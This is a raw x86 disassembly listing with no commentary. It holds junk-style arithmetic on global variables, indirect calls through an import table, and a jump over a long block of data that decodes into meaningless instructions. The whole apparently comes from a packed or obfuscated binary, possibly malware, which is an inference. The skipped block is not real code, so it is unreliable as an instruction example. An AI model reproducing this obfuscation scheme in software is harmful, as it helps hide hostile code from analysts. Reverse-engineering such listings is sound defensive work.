  4027fa:	cmp    DWORD PTR ds:0x4229aa,0x0
  402801:	mov    DWORD PTR ds:0x422962,0x2a7e
  40280b:	mov    DWORD PTR ds:0x42293e,0x75fd
  402815:	jmp    0x40286f
  40281a:	not    DWORD PTR ds:0x4228a2
  402820:	jg     0x40285d
  402826:	push   0x445a
  40282b:	push   DWORD PTR [ebp-0x24]
  40282e:	push   0x4228fe
  402833:	push   0x30cc
  402838:	push   0x5f1f
  40283d:	call   DWORD PTR ds:0x42a288
  402843:	xor    DWORD PTR ds:0x4228da,0x678e
  40284d:	adc    DWORD PTR ds:0x4228a2,0x5868
  402857:	xor    DWORD PTR ds:0x42296e,ecx
  40285d:	or     DWORD PTR ds:0x4228ba,edi
  402863:	or     DWORD PTR ds:0x42299e,ecx
  402869:	sbb    DWORD PTR ds:0x422966,ecx
  40286f:	mov    DWORD PTR [ebp-0x6c],0x1337
  402876:	mov    eax,ds:0x42294a
  40287b:	add    eax,DWORD PTR ds:0x42291e
  402881:	mov    ds:0x42294a,eax
  402886:	mov    DWORD PTR [ebp-0x70],0x7593
  40288d:	sbb    DWORD PTR ds:0x422906,edx
  402893:	mov    DWORD PTR [ebp-0x6c],0x11b8
  40289a:	mov    DWORD PTR [ebp-0x70],0x3b72
  4028a1:	mov    DWORD PTR [ebp-0x6c],0x3abc
  4028a8:	jmp    0x402e32
  4028ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028ae:	in     eax,0x5e
  4028b0:	ficom  DWORD PTR [eax+eiz*2]
  4028b3:	adc    ch,BYTE PTR [ecx-0x57e79dc5]
  4028b9:	xchg   ebp,eax
  4028ba:	jmp    0xe60eddba
  4028bf:	push   ss
  4028c0:	push   ss
  4028c1:	cmp    eax,0x41161604
  4028c6:	mov    dh,BYTE PTR [edx-0x1b]
  4028c9:	pop    eax
  4028ca:	push   esp
  4028cb:	into   
  4028cc:	shl    edx,1
  4028ce:	mov    dl,0x91
  4028d0:	xchg   ecx,eax
  4028d1:	jns    0x402926
  4028d3:	out    0xc9,eax
  4028d5:	lods   al,BYTE PTR ds:[esi]
  4028d6:	stc    
  4028d7:	mov    DWORD PTR [ecx-0x15cfbc54],edi
  4028dd:	dec    esp
  4028de:	aad    0xde
  4028e0:	fcmovb st,st(7)
  4028e2:	sahf   
  4028e3:	stc    
  4028e4:	push   ebp
  4028e5:	nop
  4028e6:	out    dx,al
  4028e7:	pop    esp
  4028e8:	jbe    0x402921
  4028ea:	or     ebx,esp
  4028ec:	jl     0x4028fd
  4028ee:	pop    ebx
  4028ef:	and    ebp,DWORD PTR [ebp-0x36]
  4028f2:	loope  0x4028f2
  4028f4:	push   ds
  4028f5:	clc    
  4028f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028f7:	cmp    eax,0x1e0bcd13
  4028fc:	bound  ecx,QWORD PTR [edi-0x1fb80df]
  402902:	retf   0x25ca
  402905:	cdq    
  402906:	repz push ss
  402908:	ins    BYTE PTR es:[edi],dx
  402909:	ins    BYTE PTR es:[edi],dx
  40290a:	rcl    esp,cl
  40290c:	aad    0xa5
  40290e:	outs   dx,BYTE PTR ds:[esi]
  40290f:	jge    0x402893
  402911:	pushf  
  402912:	and    eax,0xc717bead
  402917:	and    eax,0x223eb292
  40291c:	in     al,0x3f
  40291e:	sar    DWORD PTR [esi],0xa3
  402921:	inc    esp
  402922:	pavgw  mm0,QWORD PTR [esi-0x739174c2]
  402929:	pop    edi
  40292a:	push   eax
  40292b:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40292d:	sbb    eax,0x7711ed6f
  402932:	add    DWORD PTR [esi+0x18],ebp
  402935:	hlt    
  402936:	rcl    BYTE PTR [esi-0x217bfb47],0xe6
  40293d:	aad    0x4
  40293f:	test   eax,0xc71424d8
  402944:	xchg   ebx,eax
  402945:	inc    edi
  402946:	sbb    al,0x63
  402948:	adc    esi,edx
  40294a:	cdq    
  40294b:	xchg   ecx,eax
  40294c:	sub    al,0xdc
  40294e:	repnz addr16 or eax,0x7b5cc64e
  402955:	mov    eax,0xb6c6af40
  40295a:	test   al,0x9a
  40295c:	and    esi,DWORD PTR [edi]
  40295e:	adc    BYTE PTR [edx-0x28],0xfe
  402962:	push   ss
  402963:	pushf  
  402964:	and    esp,DWORD PTR fs:[ebx+ebp*4]
  402968:	fisttp WORD PTR [edi+ebp*2-0x37e7cd11]
  40296f:	(bad)  
  402970:	cmp    al,0x4
  402972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402973:	sub    ah,BYTE PTR [eax-0x7d]
  402976:	jmp    0xcb454981
  40297b:	mov    al,0x46
  40297d:	jnp    0x4029ba
  40297f:	div    BYTE PTR [ebx+ebx*1-0x80]
  402983:	jg     0x4029e2
  402985:	inc    edi
  402986:	outs   dx,DWORD PTR ds:[esi]
  402987:	pop    ebx
  402988:	lea    eax,ds:0x57451045
  40298e:	jbe    0x40294e
  402990:	pushf  
  402991:	pop    ebp
  402992:	div    BYTE PTR [eax]
  402994:	jae    0x402919
  402996:	add    DWORD PTR fs:[edi+0x3678157b],esp
  40299d:	xchg   esp,eax
  40299e:	aas    
  40299f:	jbe    0x402941
  4029a1:	ret    
  4029a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029a3:	das    
  4029a4:	inc    esp
  4029a5:	push   ecx
  4029a6:	lods   al,BYTE PTR ds:[esi]
  4029a7:	jg     0x402984
  4029a9:	mov    dl,0x6
  4029ab:	(bad)  
  4029ad:	push   ebp
  4029ae:	aad    0x6b
  4029b0:	int3   
  4029b1:	mov    bh,0xd8
  4029b3:	dec    edx
  4029b4:	or     DWORD PTR [esi],esp
  4029b6:	sar    BYTE PTR [eax],0x23
  4029b9:	cmp    al,0x43
  4029bb:	xchg   edi,eax
  4029bc:	mov    edi,DWORD PTR [esi-0x3c]
  4029bf:	add    ecx,DWORD PTR es:[edi+0x6fd47fcd]
  4029c6:	outs   dx,DWORD PTR ds:[esi]
  4029c7:	in     eax,0xaa
  4029c9:	jmp    0x2644:0x564ace9f
  4029d0:	in     eax,0x3d
  4029d2:	les    ecx,FWORD PTR [eax+0x8]
  4029d5:	inc    edx
  4029d6:	out    0xcf,eax
  4029d8:	or     DWORD PTR [ebp+ebp*2-0x69],0x87e885b4
  4029e0:	sti    
  4029e1:	inc    ecx
  4029e2:	aaa    
  4029e3:	mov    esi,0x675c1690
  4029e8:	dec    esi
  4029e9:	std    
  4029ea:	test   eax,0xcb294dd0
  4029ef:	scas   al,BYTE PTR es:[edi]
  4029f0:	sbb    ch,BYTE PTR [ebx+0x1]
  4029f3:	jbe    0x402a4d
  4029f5:	aad    0x6c
  4029f7:	inc    edi
  4029f8:	rcl    DWORD PTR [eax-0x2fde199f],1
  4029fe:	and    DWORD PTR [ebx*4+0x137b29d6],eax
  402a05:	js     0x402a09
  402a07:	dec    ebp
  402a08:	stc    
  402a09:	stos   DWORD PTR es:[edi],eax
  402a0a:	icebp  
  402a0b:	out    0x99,eax
  402a0d:	xchg   ecx,eax
  402a0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a0f:	xchg   ebp,eax
  402a10:	ins    BYTE PTR es:[edi],dx
  402a11:	and    ebp,edx
  402a13:	stc    
  402a14:	dec    edx
  402a15:	adc    DWORD PTR [edi],0xffffffc0
  402a18:	sbb    eax,0x9657e094
  402a1d:	cmp    eax,0xee92cac1
  402a22:	lea    edx,[ebx-0x37]
  402a25:	xlat   BYTE PTR ds:[ebx]
  402a26:	and    ecx,esp
  402a28:	scas   al,BYTE PTR es:[edi]
  402a29:	push   edx
  402a2a:	jp     0x402a96
  402a2c:	xchg   ebp,eax
  402a2d:	fiadd  DWORD PTR [ecx]
  402a2f:	lea    esp,[edx]
  402a31:	jmp    0xc191f0a7
  402a36:	jp     0x402a42
  402a38:	test   BYTE PTR [esi+0x291b5a8b],ah
  402a3e:	aad    0x9f
  402a40:	pop    es
  402a41:	pop    es
  402a42:	sub    al,0x35
  402a44:	sti    
  402a45:	push   ss
  402a46:	fistp  DWORD PTR ss:[ebp+0x5b]
  402a4a:	add    BYTE PTR [eax+0x735073a9],ch
  402a50:	push   esp
  402a51:	pop    ebp
  402a52:	pop    edi
  402a53:	scas   eax,DWORD PTR es:[edi]
  402a54:	sbb    esi,esi
  402a56:	push   0xd
  402a58:	lods   eax,DWORD PTR ds:[esi]
  402a59:	(bad)  
  402a5a:	test   al,0x70
  402a5c:	sahf   
  402a5d:	or     al,0x4
  402a5f:	xchg   ebp,eax
  402a60:	xchg   ecx,eax
  402a61:	enter  0x7f81,0xa4
  402a65:	pop    ecx
  402a66:	mov    DWORD PTR [eax+0x3a],esi
  402a69:	loop   0x402a1a
  402a6b:	outs   dx,BYTE PTR ds:[esi]
  402a6c:	ret    
  402a6d:	sahf   
  402a6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a6f:	mov    ds:0xeaa5a2b7,eax
  402a74:	in     eax,0x34
  402a76:	mov    ebx,0xed31c268
  402a7b:	cmp    al,0xd6
  402a7d:	sbb    DWORD PTR [ecx],eax
  402a7f:	into   
  402a80:	nop
  402a81:	adc    edi,eax
  402a83:	ficomp WORD PTR [ebx+0x25]
  402a86:	cmp    al,0x7
  402a88:	jmp    0xe6c3:0x61309e9f
  402a8f:	jl     0x402b0a
  402a91:	imul   ecx,DWORD PTR [edi+0x44],0xb68449df
  402a98:	mov    eax,0x4a77cd30
  402a9d:	cmp    eax,0x8ec42bf5
  402aa2:	shl    BYTE PTR [esi+ebp*2],cl
  402aa5:	xor    dl,0x37
  402aa8:	and    dl,BYTE PTR [edx]
  402aaa:	inc    ebx
  402aab:	scas   al,BYTE PTR es:[edi]
  402aac:	das    
  402aad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402aae:	repz mov ch,0xd6
  402ab1:	sbb    ecx,DWORD PTR [ecx]
  402ab3:	lahf   
  402ab4:	or     BYTE PTR [edi-0x3c],dl
  402ab7:	ss int 0xc4
  402aba:	cwde   
  402abb:	push   0xbf5d7dfb
  402ac0:	aam    0x47
  402ac2:	lock jbe 0x402ad6
  402ac5:	outs   dx,BYTE PTR ds:[esi]
  402ac6:	inc    esi
  402ac7:	dec    esi
  402ac8:	xchg   esi,eax
  402ac9:	sbb    ebp,DWORD PTR [eax+0x2d320971]
  402acf:	mov    fs,esp
  402ad1:	xor    DWORD PTR [eax-0x17],ecx
  402ad4:	or     DWORD PTR [esi],esi
  402ad6:	out    dx,al
  402ad7:	jbe    0x402b31
  402ad9:	cmp    al,0x27
  402adb:	pop    ebx
  402adc:	mov    al,0x15
  402ade:	mov    al,ds:0xebf4da14
  402ae3:	loope  0x402a74
  402ae5:	rol    DWORD PTR ds:0x2071452b,0x58
  402aec:	ds ret 0xcce8
  402af0:	mov    al,0x65
  402af2:	sub    edi,esi
  402af4:	sbb    al,0x79
  402af6:	inc    edx
  402af7:	lea    ebp,[edx+0x17]
  402afa:	cmp    ebp,DWORD PTR ds:0x8d0d1edd
  402b00:	cmp    DWORD PTR [esi],edx
  402b02:	pop    ds
  402b03:	sqrtps xmm4,XMMWORD PTR [eax-0x49b2a3a8]
  402b0a:	in     eax,0xa8
  402b0c:	dec    ecx
  402b0d:	lahf   
  402b0e:	or     BYTE PTR [ebx-0x78ba26d],dl
  402b14:	adc    dl,BYTE PTR [ebx]
  402b16:	fcmovnu st,st(2)
  402b18:	sbb    esp,DWORD PTR [eax]
  402b1a:	or     eax,0x74e659d0
  402b1f:	sbb    BYTE PTR [esi+0x40],0x85
  402b23:	sti    
  402b24:	cmp    al,0xb3
  402b26:	inc    edi
  402b27:	test   DWORD PTR [ebp+ebx*4-0x25e6ba5a],esi
  402b2e:	and    ebx,DWORD PTR [ecx]
  402b30:	(bad)  
  402b31:	retf   
  402b32:	dec    esi
  402b33:	retf   
  402b34:	push   esp
  402b35:	mov    ?,WORD PTR [edx+ecx*2-0x62]
  402b39:	pop    esi
  402b3a:	enter  0xb87c,0x17
  402b3e:	gs push esp
  402b40:	push   edi
  402b41:	das    
  402b42:	rcl    DWORD PTR [ecx],0x2f
  402b45:	cli    
  402b46:	ret    
  402b47:	lock pop es
  402b49:	cld    
  402b4a:	into   
  402b4b:	mov    ebx,DWORD PTR [ebx+eax*2+0x1f67b6a0]
  402b52:	mov    dh,0x7c
  402b54:	dec    eax
  402b55:	xor    BYTE PTR [ebp-0x25],0xb2
  402b59:	push   ebp
  402b5a:	adc    ah,BYTE PTR [edx+0x19]
  402b5d:	out    0x43,eax
  402b5f:	arpl   WORD PTR [edi],bx
  402b61:	xchg   DWORD PTR [edi-0x359069e9],edx
  402b67:	sbb    dh,bh
  402b69:	sbb    al,BYTE PTR [ecx+0x22]
  402b6c:	stc    
  402b6d:	pop    esp
  402b6e:	dec    edi
  402b6f:	outs   dx,BYTE PTR ds:[esi]
  402b70:	mov    bh,0xe7
  402b72:	sub    esp,DWORD PTR [esi+0x328cd104]
  402b78:	imul   eax,DWORD PTR [ebx+0x44],0xd3f7ab47
  402b7f:	adc    eax,0x4d908561
  402b84:	or     DWORD PTR [edx],edx
  402b86:	out    0x38,eax
  402b88:	scas   al,BYTE PTR es:[edi]
  402b89:	mov    DWORD PTR [ecx-0x2ea213ee],ecx
  402b8f:	inc    ebp
  402b90:	jl     0x402b98
  402b92:	test   eax,0xacc75dc8
  402b97:	fcos   
  402b99:	jle    0x402b69
  402b9b:	dec    esp
  402b9c:	into   
  402b9d:	sbb    esi,DWORD PTR [esi+0x48]
  402ba0:	jg     0x402bd0
  402ba2:	xchg   ecx,eax
  402ba3:	mov    bl,al
  402ba5:	or     DWORD PTR [ebx],edx
  402ba7:	mov    eax,0x6b83a461
  402bac:	cmp    BYTE PTR [ecx-0x5],cl
  402baf:	mov    ch,BYTE PTR [ebx-0xb10b0ab]
  402bb5:	and    DWORD PTR [edx+0x20e282e6],ebx
  402bbb:	mov    DWORD PTR [eax-0x2b],esp
  402bbe:	mov    ds:0x2d47d67a,al
  402bc3:	push   ebp
  402bc4:	cs mov ecx,0x18170ac
  402bca:	aaa    
  402bcb:	shr    DWORD PTR [edi+eax*1+0x3a],cl
  402bcf:	dec    edx
  402bd0:	ror    DWORD PTR [ebx+0x1fe95a92],1
  402bd6:	xchg   DWORD PTR [esi-0x6d],esi
  402bd9:	das    
  402bda:	dec    edx
  402bdb:	std    
  402bdc:	mov    ebp,0x7c58840
  402be1:	stos   DWORD PTR es:[edi],eax
  402be2:	sub    DWORD PTR [edx+0xe],0x2
  402be6:	xor    al,0x92
  402be8:	push   esi
  402be9:	add    BYTE PTR [eax+esi*2],bh
  402bec:	stos   DWORD PTR es:[edi],eax
  402bed:	imul   edx,ebx,0x433efaea
  402bf3:	adc    esp,DWORD PTR [eax+0x43]
  402bf6:	mov    ecx,0xacdf88d9
  402bfb:	mov    esp,ecx
  402bfd:	dec    esp
  402bfe:	fld    TBYTE PTR [edi]
  402c00:	sub    eax,0x89fc9a2c
  402c05:	repnz ds in eax,0xb6
  402c09:	sub    ah,ch
  402c0b:	mov    bl,0xd5
  402c0d:	dec    edx
  402c0e:	dec    edx
  402c0f:	mov    edi,0xf66fc7f7
  402c14:	test   eax,0xce3fb987
  402c19:	sub    eax,esp
  402c1b:	scas   al,BYTE PTR es:[edi]
  402c1c:	int3   
  402c1d:	jno    0x402bec
  402c1f:	loop   0x402c0c
  402c21:	test   eax,0x8b66efd0
  402c26:	sub    eax,0xcd9f757a
  402c2b:	adc    eax,0xb9df62bd
  402c30:	jmp    0x402c61
  402c32:	stos   DWORD PTR es:[edi],eax
  402c33:	repnz adc esi,edx
  402c36:	je     0x402c99
  402c38:	add    al,0xc8
  402c3a:	adc    al,0xba
  402c3c:	call   0xcb79af5c
  402c41:	fidivr WORD PTR [eax-0x4d]
  402c44:	add    esi,ecx
  402c46:	rol    BYTE PTR [ebx-0x1f],0x5d
  402c4a:	cld    
  402c4b:	ret    0x23b2
  402c4e:	data16 loope 0x402ca7
  402c51:	rcl    DWORD PTR es:[ebx],0xe2
  402c55:	and    eax,0xb3a53578
  402c5a:	repz scas eax,DWORD PTR es:[edi]
  402c5c:	inc    BYTE PTR [ecx]
  402c5e:	mul    DWORD PTR [ecx-0x56055562]
  402c64:	jnp    0x402c6c
  402c66:	mov    esp,0x1019b607
  402c6b:	mov    ecx,0xff14af6
  402c70:	in     al,dx
  402c71:	sbb    BYTE PTR [eax+ebp*2+0x47],0x2a
  402c76:	sub    ebp,ebp
  402c78:	ins    BYTE PTR es:[edi],dx
  402c79:	push   0xffffffbe
  402c7b:	ds pop edi
  402c7d:	or     eax,DWORD PTR [ecx+edi*1-0x17ee97bb]
  402c84:	xor    al,0xe4
  402c86:	xor    ecx,DWORD PTR [eax+0x39]
  402c89:	pusha  
  402c8a:	jae    0x402c72
  402c8c:	popf   
  402c8d:	rcr    DWORD PTR [ebp+ecx*2+0x3e9b5f8d],1
  402c94:	xchg   esp,eax
  402c95:	pop    edi
  402c96:	gs xchg edi,eax
  402c98:	out    0x1,al
  402c9a:	iret   
  402c9b:	fbld   TBYTE PTR [ebx-0x2a9fffc4]
  402ca1:	aam    0x63
  402ca3:	mov    ebp,0xd72308a9
  402ca8:	mov    esi,0x55e53bd5
  402cad:	fadd   QWORD PTR [edx]
  402caf:	and    BYTE PTR [ebp+0x61effb1a],dh
  402cb5:	fdivr  QWORD PTR [ebx]
  402cb7:	popf   
  402cb8:	into   
  402cb9:	lods   al,BYTE PTR ds:[esi]
  402cba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cbb:	cmp    eax,0x80e0755e
  402cc0:	and    DWORD PTR [ecx+ebp*1-0x25],edx
  402cc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cc5:	pusha  
  402cc6:	ds in  al,0xcd
  402cc9:	stc    
  402cca:	sub    eax,0xb25eb81d
  402ccf:	and    BYTE PTR [eax],0xb6
  402cd2:	adc    cl,ch
  402cd4:	cwde   
  402cd5:	fst    DWORD PTR [eax+ebp*4]
  402cd8:	adc    cl,BYTE PTR [esi-0x7997b425]
  402cde:	daa    
  402cdf:	hlt    
  402ce0:	stos   BYTE PTR es:[edi],al
  402ce1:	xchg   esi,eax
  402ce2:	cld    
  402ce3:	cs popf 
  402ce5:	dec    edx
  402ce6:	or     edi,DWORD PTR [edi+0x34]
  402ce9:	jp     0x402d5a
  402ceb:	mov    esp,0x61e7c374
  402cf0:	aas    
  402cf1:	call   0xd0ab:0x8442e607
  402cf8:	lock jg 0x402ca0
  402cfb:	(bad)  
  402cfc:	xchg   edx,eax
  402cfd:	aas    
  402cfe:	fst    DWORD PTR [esp+edx*1-0x12fd31f9]
  402d05:	xchg   BYTE PTR [ebx-0x1ead87f2],ch
  402d0b:	popa   
  402d0c:	fld    TBYTE PTR [ebx]
  402d0e:	je     0x402cbd
  402d10:	ficom  DWORD PTR [edi+0x57c56245]
  402d16:	inc    edi
  402d17:	sbb    edx,DWORD PTR [eax]
  402d19:	mov    esi,0x7216504c
  402d1e:	adc    DWORD PTR [eax],eax
  402d20:	sbb    eax,0xd62f6906
  402d25:	loope  0x402d1d
  402d27:	sub    ecx,DWORD PTR [edx+0x16b4efe4]
  402d2d:	repnz int3 
  402d2f:	imul   edi,DWORD PTR [esi-0xf6529a2],0xffffffe7
  402d36:	aaa    
  402d37:	loop   0x402d79
  402d39:	cmp    eax,0x4d54c916
  402d3e:	xchg   ebx,eax
  402d3f:	pop    es
  402d40:	mov    DWORD PTR [ecx+0x306bc2c6],ebx
  402d46:	pop    eax
  402d47:	sub    eax,0x34ec68f0
  402d4d:	lock (bad) 
  402d4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d51:	adc    al,0xad
  402d53:	add    DWORD PTR [edx+esi*1-0x22ef8dc0],ebp
  402d5a:	jmp    0x402d9a
  402d5c:	mov    bh,ch
  402d5e:	sbb    esp,DWORD PTR [edx]
  402d60:	mov    esi,0x5e0eaa7
  402d65:	mov    esp,0x4c3d3977
  402d6a:	push   0xffffffb4
  402d6c:	dec    eax
  402d6d:	and    DWORD PTR [ebx+edi*4+0x38be1dd9],edx
  402d74:	sti    
  402d75:	xor    BYTE PTR [ebx],ch
  402d77:	push   edi
  402d78:	xor    al,0x5d
  402d7a:	or     esi,0x3d
  402d7d:	aam    0xd2
  402d7f:	scas   eax,DWORD PTR es:[edi]
  402d80:	xchg   ecx,eax
  402d81:	mov    ds:0xa6891bb3,eax
  402d86:	pop    edx
  402d87:	mov    al,ds:0x218df4b9
  402d8c:	mov    ds:0x86139cc9,al
  402d91:	push   esp
  402d92:	into   
  402d93:	mov    ecx,DWORD PTR [ebx+esi*1-0x20471d9e]
  402d9a:	enter  0x7ed5,0x35
  402d9e:	add    eax,0x445fbe05
  402da3:	push   ebx
  402da4:	pop    ebx
  402da5:	loopne 0x402d63
  402da7:	pop    ebp
  402da8:	xchg   edx,edi
  402daa:	jmp    0x8bcd6292
  402daf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402db0:	sub    al,0x23
  402db2:	mov    dl,0x6a
  402db4:	pop    ds
  402db5:	shr    DWORD PTR [edx+0x32f6fd90],cl
  402dbb:	xor    esi,DWORD PTR [ebx]
  402dbd:	retf   0x577d
  402dc0:	fwait
  402dc1:	ss push ecx
  402dc3:	sbb    al,0x3d
  402dc5:	sbb    eax,0xefe57883
  402dca:	neg    BYTE PTR [edi-0x49]
  402dcd:	mov    eax,ds:0x8de55afb
  402dd2:	push   0x6e0bde78
  402dd7:	mov    bh,0x3f
  402dd9:	jne    0x402ddc
  402ddb:	inc    esp
  402ddc:	repnz mov esp,0x5bc8325a
  402de2:	pop    eax
  402de3:	fs xchg esi,eax
  402de5:	out    0x59,al
  402de7:	add    BYTE PTR [ebx+ebx*2-0x45],0xf3
  402dec:	push   esi
  402ded:	les    edi,FWORD PTR [eax-0x35]
  402df0:	pop    ecx
  402df1:	adc    ebx,DWORD PTR [edi]
  402df3:	sbb    ebx,DWORD PTR [edx]
  402df5:	mov    edx,0x32681919
  402dfa:	push   esp
  402dfb:	jmp    0x9dd41a9f
  402e00:	push   cs
  402e01:	je     0x402d84
  402e03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e04:	fwait
  402e05:	xchg   ebp,eax
  402e06:	jmp    0x8ea8:0x3920163d
  402e0d:	xor    bl,bl
  402e0f:	xor    ah,BYTE PTR [eax+0x2b]
  402e12:	xchg   ecx,eax
  402e13:	retf   0x285b
  402e16:	ja     0x402e8c
  402e18:	push   ds
  402e19:	cmp    eax,DWORD PTR [edx]
  402e1b:	addr16 pop edx
  402e1d:	xchg   esi,eax
  402e1e:	adc    eax,0x158774b3
  402e23:	jbe    0x402dce
  402e25:	inc    edx
  402e26:	push   edx
  402e27:	rcr    eax,0x30
  402e2a:	xor    BYTE PTR [esp+esi*8-0x7f],0x53
  402e2f:	push   esi
  402e30:	shl    bl,cl
  402e32:	mov    DWORD PTR [ebp-0x68],0x1b45
  402e39:	mov    DWORD PTR ds:0x42299e,0x718
  402e43:	mov    DWORD PTR [ebp-0x64],0x767d
  402e4a:	cmp    DWORD PTR ds:0x42295a,0x0
  402e51:	mov    DWORD PTR ds:0x4229ba,0x78de
  402e5b:	mov    DWORD PTR ds:0x422976,0x1706
  402e65:	jmp    0x402ecb
  402e6a:	mov    DWORD PTR ds:0x4228ca,0x464
  402e74:	not    eax
  402e76:	jne    0x402ea1
  402e7c:	push   0x8a0f
  402e81:	call   DWORD PTR ds:0x42a28c
  402e87:	add    DWORD PTR ds:0x422982,ecx
  402e8d:	add    DWORD PTR ds:0x422912,0x4228d6
  402e97:	add    DWORD PTR ds:0x42291a,0x3216
  402ea1:	sub    DWORD PTR ds:0x4229be,0x591
  402eab:	adc    DWORD PTR ds:0x4228f2,0x4409
  402eb5:	add    DWORD PTR ds:0x4228fe,ebx
  402ebb:	add    DWORD PTR ds:0x4229ae,0x46bd
  402ec5:	sub    DWORD PTR ds:0x422936,ecx
  402ecb:	mov    DWORD PTR [ebp-0x60],0x1d973857
  402ed2:	mov    DWORD PTR ds:0x42294a,0xbf3
  402edc:	mov    DWORD PTR [ebp-0x5c],0x0
  402ee3:	mov    DWORD PTR [ebp-0x34],0x599d
  402eea:	add    DWORD PTR ds:0x4228fa,edi
  402ef0:	mov    DWORD PTR [ebp-0x2c],0x165d
  402ef7:	movzx  eax,WORD PTR ds:0x4228a2
  402efe:	and    DWORD PTR ds:0x4229ae,eax
  402f04:	mov    DWORD PTR [ebp-0x1c],0xc51
  402f0b:	xor    eax,0x7ef6
  402f10:	mov    DWORD PTR [ebp-0x44],0x3f55
  402f17:	inc    eax
  402f18:	mov    DWORD PTR [ebp-0x44],0x1
  402f1f:	mov    DWORD PTR [ebp-0x44],0x42e8
  402f26:	cmp    DWORD PTR ds:0x4228a6,0x0
  402f2d:	mov    DWORD PTR ds:0x422926,ebx
  402f33:	mov    DWORD PTR ds:0x42296e,0x475b
  402f3d:	jmp    0x403081
  402f42:	mov    DWORD PTR ds:0x4228fa,0x2105
  402f4c:	not    eax
  402f4e:	jne    0x402f83
  402f54:	push   0x132b
  402f59:	push   DWORD PTR [ebp-0x14]
  402f5c:	push   DWORD PTR [ebp-0x10]
  402f5f:	call   DWORD PTR ds:0x42a290
  402f65:	xor    DWORD PTR ds:0x422932,0x9bb
  402f6f:	or     DWORD PTR ds:0x422996,0x4228ea
  402f79:	and    DWORD PTR ds:0x422932,0x4229ce
  402f83:	and    DWORD PTR ds:0x4229ce,edi
  402f89:	add    DWORD PTR ds:0x4228e6,0x4228da
  402f93:	dec    DWORD PTR ds:0x4229b2
  402f99:	xor    DWORD PTR ds:0x4228ee,ecx
  402f9f:	cmp    DWORD PTR ds:0x422996,0x0
  402fa6:	mov    DWORD PTR ds:0x4228e6,0xf94
  402fb0:	mov    DWORD PTR ds:0x4228de,0x6d8f
  402fba:	mov    DWORD PTR ds:0x42291e,0x78af
  402fc4:	jmp    0x403081
  402fc9:	mov    DWORD PTR ds:0x42290e,ebx
  402fcf:	mov    DWORD PTR ds:0x4228fe,0x3885
  402fd9:	jge    0x402ffe
  402fdf:	push   0x3dec
  402fe4:	call   DWORD PTR ds:0x42a044
  402fea:	add    DWORD PTR ds:0x42298e,0x4228ba
  402ff4:	sub    DWORD PTR ds:0x422916,0x422996
  402ffe:	add    DWORD PTR ds:0x42294e,0x308f
  403008:	sub    DWORD PTR ds:0x42299a,ebx
  40300e:	or     DWORD PTR ds:0x4228e2,0x4229ce
  403018:	and    DWORD PTR ds:0x422996,0x422972
  403022:	cmp    DWORD PTR ds:0x4228be,0x0
  403029:	mov    DWORD PTR ds:0x422896,0x7e8b
  403033:	mov    DWORD PTR ds:0x4228d2,0x6e2b
  40303d:	jmp    0x403081
  403042:	mov    eax,ds:0x42294e
  403047:	mov    DWORD PTR ds:0x422912,0x27c8
  403051:	jl     0x403071
  403057:	call   DWORD PTR ds:0x42a294
  40305d:	xor    DWORD PTR ds:0x4228f6,0x34a0
  403067:	and    DWORD PTR ds:0x42299e,0x4228c2
  403071:	or     DWORD PTR ds:0x4229b2,0x422916
  40307b:	xor    DWORD PTR ds:0x422892,ecx
  403081:	mov    eax,DWORD PTR [ebp-0x60]
  403084:	shl    ecx,0x1e
  403087:	mov    ecx,DWORD PTR [ebp-0x5c]
  40308a:	and    DWORD PTR ds:0x422912,0x10bb
  403094:	push   ecx
  403095:	inc    DWORD PTR ds:0x42298e
  40309b:	push   eax
  40309c:	push   0xddf
  4030a1:	push   0x2d0f
  4030a6:	add    DWORD PTR ds:0x4228d6,0x562b
  4030b0:	call   0x421b6b
  4030b5:	mov    ecx,DWORD PTR [ebp-0x68]
  4030b8:	add    DWORD PTR ds:0x4228e6,0x12e8
  4030c2:	mov    edx,DWORD PTR [ebp-0x64]
  4030c5:	sub    DWORD PTR ds:0x42290e,0x5673
  4030cf:	xor    eax,ecx
  4030d1:	not    ecx
  4030d3:	mov    ecx,DWORD PTR [ebp-0x70]
  4030d6:	add    edx,0x725d
  4030dc:	mov    edx,DWORD PTR [ebp-0x6c]
  4030df:	sub    edx,DWORD PTR ds:0x4228f2
  4030e5:	sub    eax,ecx
  4030e7:	cmp    DWORD PTR ds:0x4228c2,0x0
  4030ee:	mov    DWORD PTR ds:0x42295a,0x2680
  4030f8:	mov    edx,0xd63
  4030fd:	movzx  edx,BYTE PTR ds:0x4229ce
  403104:	mov    DWORD PTR ds:0x4228b6,ecx
  40310a:	jmp    0x403179
  40310f:	mov    DWORD PTR ds:0x4228f2,0x12c1
  403119:	mov    DWORD PTR ds:0x4228d2,ecx
  40311f:	jl     0x403160
  403125:	push   0x234a
  40312a:	push   0x7349
  40312f:	push   DWORD PTR [ebp-0x28]
  403132:	call   DWORD PTR ds:0x42a00c
  403138:	xor    edx,edx
  40313a:	or     edx,DWORD PTR ds:0x4229fe
  403140:	mov    edx,DWORD PTR [edx]
  403142:	sbb    DWORD PTR ds:0x4229ca,edx
  403148:	sbb    edx,DWORD PTR ds:0x42294a
  40314e:	mov    edx,DWORD PTR ds:0x42293e
  403154:	add    edx,DWORD PTR ds:0x42290e
  40315a:	mov    DWORD PTR ds:0x42293e,edx
  403160:	sbb    edx,0x27b8
  403166:	movzx  edx,BYTE PTR ds:0x422902
  40316d:	or     edx,DWORD PTR ds:0x422912
  403173:	mov    DWORD PTR ds:0x422902,edx
  403179:	mov    ecx,DWORD PTR ds:0x422298
  40317f:	mov    edx,DWORD PTR ds:0x4229ee
  403185:	mov    edx,DWORD PTR [edx]
  403187:	xor    DWORD PTR ds:0x4228be,edx
